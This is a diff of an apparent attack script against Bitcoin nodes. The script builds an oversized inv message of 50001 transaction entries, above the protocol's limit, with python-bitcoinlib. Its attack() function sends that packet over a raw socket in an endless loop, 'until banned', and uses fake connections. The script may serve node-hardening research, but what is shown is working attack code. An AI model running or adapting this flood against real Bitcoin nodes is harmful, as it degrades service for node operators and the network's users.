@@ -109,8 +109,10 @@ def addr_pkt( str_addrs ):
 # Construct an inv packet using python-bitcoinlib
 def inv_packet():
 	msg = msg_inv(bitcoin_protocolversion)
-	msg.inv = [msg_tx(bitcoin_protocolversion)] * 50001
-	msg.type = 1 # 1=TX
+	msg.type = 1
+	tx = msg_tx(bitcoin_protocolversion)
+	tx.type = 1
+	msg.inv = [tx] * 50001
 	return msg
 
 # Construct a version packet using python-bitcoinlib
@@ -209,11 +211,12 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 
 # Send version repeatedly, until banned
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
+	inv = inv_packet().to_bytes()
 	while True:
 		if seconds_between_version_packets != 0:
 			time.sleep(seconds_between_version_packets)
 		try:
-			socket.send(inv_packet().to_bytes())
+			socket.send(inv)
 		except Exception as e:
 			print(e)
 			break
